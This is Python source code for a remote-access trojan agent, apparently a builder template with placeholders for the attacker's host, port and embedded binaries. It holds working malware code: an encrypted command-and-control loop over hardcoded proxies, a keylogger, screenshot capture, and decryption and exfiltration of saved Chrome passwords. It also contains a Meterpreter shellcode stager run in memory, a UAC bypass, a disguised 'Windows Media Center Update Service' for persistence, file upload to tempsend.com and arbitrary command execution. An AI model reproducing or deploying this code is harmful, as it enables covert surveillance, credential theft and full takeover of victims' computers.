***JUNK***
def fscreenshot():
	hwnd = 0
	hwndDC = win32gui.GetWindowDC(hwnd)
	mfcDC = win32ui.CreateDCFromHandle(hwndDC)
	saveDC = mfcDC.CreateCompatibleDC()
	saveBitMap = win32ui.CreateBitmap()
	MoniterDev = win32api.EnumDisplayMonitors(None,None)
	w = MoniterDev[0][2][2]
	h = MoniterDev[0][2][3]
	saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)
	saveDC.SelectObject(saveBitMap)
	saveDC.BitBlt((0,0),(w, h) , mfcDC, (0,0), win32con.SRCCOPY)
	bmpname=win32api.GetTempFileName(".","")[0]+'.bmp'
	saveBitMap.SaveBitmapFile(saveDC, bmpname)
	mfcDC.DeleteDC()
	saveDC.DeleteDC()
	win32gui.ReleaseDC(hwnd, hwndDC)
	win32gui.DeleteObject(saveBitMap.GetHandle())
	fsubprocess('del *.tmp')
	return bmpname

def fconnect():
	global s, success, pconnect
	pconnect = False
	if useproxy:
		while not pconnect:
			for proxy in proxies:
				try:
					s = socks.socksocket()
					s.setproxy(socks.HTTP,proxy[0],proxy[1])
					s.settimeout(20)
					s.connect((host, port))
					success = "GET / HTTP/1.1**r**n**r**n" + success
					pconnect = True
					break
				except:
					pass
	else:
		while not pconnect:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(20)
				s.connect((host, port))
				pconnect = True
			except:
				pass
	s.send(success)
	s.settimeout(999)
	pwd = os.getcwd()

def fwget(url):
	down = ***URLO***(url)
	filename = url.split('/')[-1]
	with open(pwd.strip('**r') + os.sep + filename,'wb') as o:
		o.write(down.read())

def ftempsend(ufile):
	if os.sep not in ufile:
		ufile = pwd.strip('**r') + os.sep + ufile
	if not os.path.isfile(ufile):
		return ' [X] Error, no file found at %s.' % (ufile)
	with open(ufile, 'rb') as uf:
		r = requests.post("http://tempsend.com/send", data={'expire':'2678400'}, files={'file': uf})
	return ' [*] ' + str(r.url)

def fpersist():
	vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
	with open(vbsdst, 'w') as pv:
		pv.write(vbscript)
	fsubprocess('attrib +h ' + vbsdst)
	cmds = "copy " + sys.argv[0] + ' ' + agent + '**n'
	cmds += 'sc create %s binPath= "cmd.exe /c wscript.exe ' % (servicename) + vbsdst + '" type= own start= auto**n'
	cmds += 'del ' + tempvbs + '**n'
	cmds += 'sc description ' + servicename + ' ' + servicedisc + '**n'
	cmds += 'del /AH "%~f0" & sc start ' + servicename + '**n'
	hb = 'CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False**n'
	with open(tempvbs, 'w') as hid:
		hid.write(hb)
	with open(tempbat, 'w') as cbat:
		cbat.write(cmds)
	with open(datafile, 'wb') as df:
		df.write(persistinfo)
	fsubprocess('attrib +h ' + tempvbs)
	fsubprocess('attrib +h ' + tempbat)
	rcmd = tempvbs + ' ' + tempbat
	fbypass(rcmd)
	fsubprocess('taskkill /f /im ' + sys.argv[0])
	sys.exit()

def funpersist():
	with open(datafile, 'rb') as f:
		settings = DecodeAES(cipher, f.read().strip(''))
		settings = settings[30:].split('**n')
	agentn = settings[0]
	vbsdstn = settings[1]
	fsubprocess('sc delete %s' % servicename)
	with open(os.getenv('TEMP') + os.sep + 'u.bat', 'w') as f:
		f.write('del /F /AH %s**n' % vbsdstn)
		f.write('del /F /AH %s**n' % agentn)
		f.write('del /F "%~f0"**n')
	encrypted = EncodeAES(cipher, 'WTFWTFWTFWTFWTF1WTFWTFWTFWTFWTF1 [*] Persistence uninstalled.**n')
	s.send(encrypted)
	os.startfile(os.getenv('TEMP') + os.sep + 'u.bat')
	sys.exit()

def fmeterdrop(mhost, mport):
	try:
		global DropSock
		DropSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		DropSock.connect((mhost, int(mport)))
		yWubQo = struct.pack('<i', DropSock.fileno())
		l = struct.unpack('<i', str(DropSock.recv(4)))[0]
		UDDvfkFdFXs = "     "
		while len(UDDvfkFdFXs) < l: UDDvfkFdFXs += DropSock.recv(l)
		HNzdFhkeybuffervICp = ctypes.create_string_buffer(UDDvfkFdFXs, len(UDDvfkFdFXs))
		HNzdFhkeybuffervICp[0] = binascii.unhexlify('BF')
		for i in xrange(4): HNzdFhkeybuffervICp[i+1] = yWubQo[i]
		return HNzdFhkeybuffervICp
	except: return None

def fexecinmem(shellcode):
	if shellcode != None:
		iNGRgaQLVJ = bytearray(shellcode)
		imHlcWqpKVwgodv = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(iNGRgaQLVJ)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
		ctypes.windll.kernel32.VirtualLock(ctypes.c_int(imHlcWqpKVwgodv), ctypes.c_int(len(iNGRgaQLVJ)))
		DWsMxliK = (ctypes.c_char * len(iNGRgaQLVJ)).from_buffer(iNGRgaQLVJ)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(imHlcWqpKVwgodv), DWsMxliK, ctypes.c_int(len(iNGRgaQLVJ)))
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(imHlcWqpKVwgodv),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

def frunthis(cmd):
	os.popen(cmd)

def fkeypress(event):   
	global keydump
	if event.Ascii:
		char = chr(event.Ascii) 
		if event.Ascii == 13:   
			keydump += "**n"
		elif event.Ascii == 8:
			keydump += "[Backspace]"
		elif event.Ascii == 9:
			keydump += "[Tab]"
		elif event.Ascii == 16:
			keydump += "[Shift]"
		elif event.Ascii == 17:
			keydump += "[Control]"
		elif event.Ascii == 27:
			keydump += "[Escape]"
		elif event.Ascii == 35:
			keydump += "[End]"
		elif event.Ascii == 36:
			keydump += "[Home]"
		elif event.Ascii == 37:
			 keydump += "[Left]"
		elif event.Ascii == 38:
			keydump += "[UP]"
		elif event.Ascii == 39:
			keydump += "[Right]"
		elif event.Ascii == 40:
			keydump += "[Down]"
		else:
			if char in string.printable:
				keydump += char

def fkeylog():
	proc = pyHook.HookManager()    
	proc.KeyDown = fkeypress
	proc.HookKeyboard()
	pythoncom.PumpMessages()

def fbypass(cmd):
	with open(bypassexe, 'wb') as uac:
		if is64:
			uac.write(bypass64exe.decode('base64'))
		else:
			uac.write(bypass86exe.decode('base64'))
	fsubprocess('attrib +h ' + bypassexe)
	rcmd = bypassexe + ' elevate /c ' + cmd
	back = fsubprocess(rcmd)
	os.remove(bypassexe)
	os.remove(os.sep.join(bypassexe.split(os.sep)[:-1]) + os.sep + 'tior.exe')
	return back

def fsubprocess(cmd):
	if ushell:
		cmd = '''%s -c "%s"''' % (ushell, cmd)
	out = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	return out.stdout.read() + out.stderr.read()

def fremoteprint(data):
	data = data + '**nEOFEOFEOFEOFEOFX'
	encrypted = EncodeAES(cipher, data)
	s.send(encrypted)

host, port, secret = '***HOST***', ***PORT***, '***SECRET***'

***64EXE***
***86EXE***

BLOCK_SIZE, PADDING, keydump = 32, '{', ''
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: ***B64E***(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(***B64D***(e))
iv = Random.new().read(***AES***.block_size)
cipher = ***AES***.new(secret,***AES***.MODE_CFB, iv)
MeterBin, DropSock = None, None
isAdmin, isSystem, is64, isWindows, ushell = False, False, False, False, False
pwd = os.getcwd()
opsys = platform.uname()[0] + ' ' + platform.uname()[2]
paddedopsys = opsys + '*' * (64 - len(opsys))
starpadding = '*' * 16

if platform.machine()[-2:] == '64':
	is64 = True

if os.name == 'nt':

	# Variables for windows:
	# These will be deleted straight after use:

	tempvbs = os.getenv('TEMP') + '%sh.vbs' % (os.sep)
	tempbat = os.getenv('TEMP') + '%sc.bat' % (os.sep)
	bypassexe = os.getenv('TEMP') + '%ssvchost.exe' % (os.sep)

	# These are permanent (used for persistence):
	
	agent = os.getenv('WINDIR') + '%sIME%simekr8%sdicts%sWinMedia.exe' % (os.sep, os.sep, os.sep, os.sep)   
	agentname = agent.split(os.sep)[-1]
	vbsdst = os.getenv('APPDATA') + '%s..%sLocal%sWindowsMediaUpdate.vbs' % (os.sep, os.sep, os.sep) 
	servicename = '"' + 'Windows Media Center Update Service' + '"'
	servicedisc = '"' + 'Windows Media Center Update Service for installation, modification, and removal of Windows updates and optional components. If this service is disabled, install or uninstall of Windows updates might fail for this computer.' + '"'
	proxyfile = os.getenv('TEMP') + os.sep + 'xmlrpc.dat'
	datafile = os.getenv('WINDIR') + os.sep + 'Temp' + os.sep + 'winrand.dat'

	pwdvar = 'cd'
	isWindows = True
	paddedpwd = pwd.strip('**r') + '*' * (64 - len(pwd.strip('**r')))
	adm = fsubprocess('whoami').strip('**n').strip('**r')
	stdout = fsubprocess('net localgroup administrators | find "%USERNAME%"').strip('**n').strip('**r')
	persistinfo = EncodeAES(cipher, '*' * 30 + '%s**n%s**n%s**n%s**n%s' % (agent, vbsdst, servicename, proxyfile, tempvbs))

	if stdout != '':
		isAdmin = True

	if adm.lower() == 'nt authority\system':
		isSystem = True

	if isSystem:
		try:
			fsubprocess('attrib +h ' + agent)
		except:
			pass
***PERSIST***
	if is64:
		if isSystem:
			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOSY%s%s' % (paddedopsys, paddedpwd, starpadding))
		else:
			if isAdmin:
				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOAY%s%s' % (paddedopsys, paddedpwd, starpadding))
			else:
				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOFY%s%s' % (paddedopsys, paddedpwd, starpadding))
	else:
		if isSystem:
			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOSH%s%s' % (paddedopsys, paddedpwd, starpadding))
		else:
			if isAdmin:
				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOAH%s%s' % (paddedopsys, paddedpwd, starpadding))
			else:
				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOFH%s%s' % (paddedopsys, paddedpwd, starpadding))

elif os.name == 'posix':
	if os.getuid() == 0:
		isSystem = True
	pwdvar = 'pwd'
	ushell = os.getenv('SHELL')
	paddedpwd = pwd + '*' * (64 - len(pwd))
	if isSystem:
		if is64:
			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLY%s%s' % (paddedopsys, paddedpwd, starpadding))
		else:
			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLH%s%s' % (paddedopsys, paddedpwd, starpadding))
	else:
		if is64:
			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLY%s%s' % (paddedopsys, paddedpwd, starpadding))
		else:
			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLH%s%s' % (paddedopsys, paddedpwd, starpadding))

else:
	pwdvar = 'pwd'
	paddedpwd = pwd + '*' * (64 - len(pwd))
	success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOUH%s%s' % (paddedopsys, paddedpwd, starpadding))


try:
	proxies = []
	with open(proxyfile) as pl:
		decpl = DecodeAES(cipher, pl.read())
	for line in decpl.split('**n'):
		proxies.append([line.split(':')[0], int(line.split(':')[1])])
except:
	#################################################################################################################

                               # HTTP PROXY SETTINGS - proxies can only be HTTP/S !

							   # Add as many proxies as you want below, the script will
							   # try them all in order in a loop until it connects.

	proxies = [["37.187.58.37", 3128], ["188.40.252.215", 7808], ["65.49.14.147", 3080], ["188.40.252.215", 3127], ["64.31.22.143", 8089],
			  ["108.165.33.7", 3128], ["108.165.33.12", 3128], ["104.140.67.36", 8089], ["108.165.33.4", 3128]] 

	#################################################################################################################

***PROXY***


fconnect()

while True:
	try:
		data = s.recv(8192)
		decrypted = DecodeAES(cipher, data)
	except:
		fconnect()
		decrypted = 'donaught'

	if decrypted == "quit" or decrypted == "exit":
		s.close()
		sys.exit()

	elif decrypted == 'donaught':
		pass

	elif decrypted.startswith('screenshot'):
		upfile = fscreenshot()
		with open(upfile, 'rb') as f:
			encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFSEOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZEOFEOFEOFEOFEOFZ")
		s.send(encrypted)
		os.remove(upfile)

	elif decrypted.startswith("tempsend "):
		fremoteprint(ftempsend(decrypted.split(' ')[1]))

	elif decrypted.startswith('proxyupdate'):
		proxlist = decrypted[11:]
		if decrypted.endswith('EOPL'):
			proxlist = proxlist[:-4]
		else:
			while not decrypted.endswith('EOPL'):
				data = s.recv(8192)
				decrypted = DecodeAES(cipher, data)
				if decrypted.endswith('EOPL'):
					proxlist += decrypted[:-4]
					break
				else:
					proxlist += decrypted
		with open(proxyfile, 'wb') as pl:
			pl.write(EncodeAES(cipher, proxlist))
		encrypted = EncodeAES(cipher, 'WTFWTFWTFWTFWTF1WTFWTFWTFWTFWTF1 [*] New proxy list stored at %s**n' % (proxyfile))
		s.send(encrypted)
		fsubprocess('attrib +h ' + proxyfile)

	elif decrypted.startswith("chromepass"):
		if pwdvar == 'cd':
			sendpass = ''
			appdata = os.getenv("APPDATA")
			paths = []
			chromepath = appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep,os.sep)
			chromiumpath = appdata + "%s..%sLocal%sChromium%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep)
			aviatorpath = appdata + "%s..%sLocal%sAviator%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep)

			if os.path.isfile(chromepath):
				paths.append([chromepath, 'Chrome'])

			if os.path.isfile(chromiumpath):
				paths.append([chromiumpath, 'Chromium'])

			if os.path.isfile(aviatorpath):
				paths.append([aviatorpath, 'Aviator']) 

			if len(paths) > 0:
				sendit = ''
				for passpath in paths:
					sendpass = ''
					connection = sqlite3.connect(passpath[0])
					cursor = connection.cursor()
					cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
					for information in cursor.fetchall():
						passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
						if passw:
							sendpass += ' [*] Website-origin: ' + information[0]
							sendpass += '**n [*] Website-action: ' + information[1]
							sendpass += '**n [*] Username: ' + information[2]
							sendpass += '**n [*] Password: ' + passw + '**n'
					if sendpass:
						sendit += '**n [*] Passwords found for %s:**n' % (passpath[1])
						sendit += sendpass
					else:
						sendit += '**n [X] No passwords found for %s.**n' % (passpath[1])
				fremoteprint(sendit)
			else:
				fremoteprint(' [X] Chrome, Chromium and Aviator are not installed.')
		else:
			fremoteprint(" [X] Error: chromepass command is only available on windows.")

	elif decrypted.startswith("keydump"):
		fremoteprint(keydump)

	elif decrypted.startswith("keyscan"):
		kl = threading.Thread(target = fkeylog)
		kl.start()
		fremoteprint(" [*] Keylogging started.")

	elif decrypted.startswith("keyclear"):
		fremoteprint("%s**n [*] Keybuffer cleared." % (keydump))
		keydump = ''

	elif decrypted.startswith("meterpreter "):
		try:
			mhost,mport = decrypted.split(' ')[1].split(':')
			MeterBin = fmeterdrop(mhost, mport)
			fremoteprint(" [*] Meterpreter reverse_tcp sent to %s:%s" % (mhost, mport))
			t = threading.Thread(target = fexecinmem, args = (MeterBin , ))
			t.start()
		except:
			fremoteprint(" [X] Failed to load meterpreter.**n   e.g: meterpreter 192.168.1.20:4444")

	elif decrypted.startswith("persistence"):
		if os.name == 'nt':
			if isAdmin and platform.uname()[2] == '7':													## If the current user is admin we will use bypassuac to install a system service with a vbs script that keeps our agent alive ;)
				if not os.path.isfile(datafile):
					fpersist()
				else:
					fbypass('sc start ' + servicename)
			else:																						## As a regualr user all we can do is search for system services with weak directory permissions
				vulnpaths = ''
				winservices = fsubprocess(***WINSERVICES***)
				for line in winservices.split('**n'):
					if line:
						if line[0] == '"':
							line = '"' + line.split('"')[1].strip('**r') + '"'
						else:
							line = '"' + line.split('/')[0].strip('**r') + '"'
						out = fsubprocess('icacls ' + line)
						if out.find("BUILTIN" + os.sep + "Users:(I)(F)") != -1 or out.find("BUILTIN" + os.sep + "Users:(F)") != -1:
							vulnpaths += line + '**n'
				if vulnpaths:
					fremoteprint(" [*] Windows services with weak directory permissions:**n**n%s" % (vulnpaths))
				else:
					fremoteprint(" [X] No services with weak directory permissions found.")
		else:
			fremoteprint(" [X] Persistence is only available for windows.")

	elif decrypted.startswith('unpersist'):
		if not os.path.isfile(datafile):
			fremoteprint(' [X] Persistence does not appear to be installed.')
		else:
			funpersist()

	elif decrypted.startswith("bypassuac "):
		cmds = ' '.join(decrypted.split(' ')[1:])
		out = fbypass(cmds)
		encrypted = EncodeAES(cipher, 'WTFWTFWTFWTFWTF1WTFWTFWTFWTFWTF1%s' % (out))
		s.send(encrypted)

	elif decrypted.startswith("download "):
		if decrypted.split(' ')[1].find(os.sep) == -1:
			downpath = pwd.strip('**r') + os.sep + decrypted.split(' ')[1]
		else:
			downpath = decrypted.split(' ')[1]
		with open(downpath, 'rb') as f:
			encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFSEOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZEOFEOFEOFEOFEOFZ")
		s.send(encrypted)

	elif decrypted.startswith("wget "):
		try:
			url = decrypted.split(' ')[1]
			fwget(url)
			fremoteprint(" [*] %s downloaded." % (url.split('/')[-1]))
		except:
			fremoteprint(" [X] Could not download %s." % (url))

	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):													## Data starting with this code indicates we are to receive a file
		try:
			ufilename = pwd.strip('**r') + os.sep + decrypted[32:48].strip('*')
			decrypted = decrypted[48:]
			with open(ufilename, 'wb') as f:
				if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
					decrypted = decrypted[:-32]
					f.write(decrypted)
				else:
					f.write(decrypted)
					while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
						data = s.recv(8192)
						decrypted = DecodeAES(cipher, data)
						if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
							f.write(decrypted[:-32])
						else:
							f.write(decrypted)
			fremoteprint(" [*] File uploaded to %s" % (ufilename))
		except Exception as e:
			fremoteprint(" [*] Something went wrong: %s" % (e))

	elif decrypted.startswith('run '):
		cmd = 'cd ' + pwd + '&&' + ' '.join(decrypted.split(' ')[1:]) 
		t = threading.Thread(target = frunthis, args = (cmd , ))
		t.start()
		fremoteprint(' [*] Executed "' + ' '.join(decrypted.split(' ')[1:]) + '" in ' + pwd)

	else:
		for char in decrypted:
			if char not in string.printable:
				encrypted = EncodeAES(cipher, starpadding * 3 + '^^')
				s.send(encrypted)
				decrypted = 'donaught'
				break
		if decrypted != 'donaught':
			cmd = 'cd %s&&%s&&%s' % (pwd, decrypted, pwdvar)												## This is how we maintain pwd
			stdout = fsubprocess(cmd)
			try:
				checkpath = stdout.split('**n')[-2].strip('**n').strip('**r')
				if os.path.exists(checkpath):
					pwd = checkpath
			except:
				pass
			result = '**n'.join(stdout.split('**n')[:-1])
			try:
				fremoteprint(result)
			except:
				fconnect()

s.close()
***JUNK2***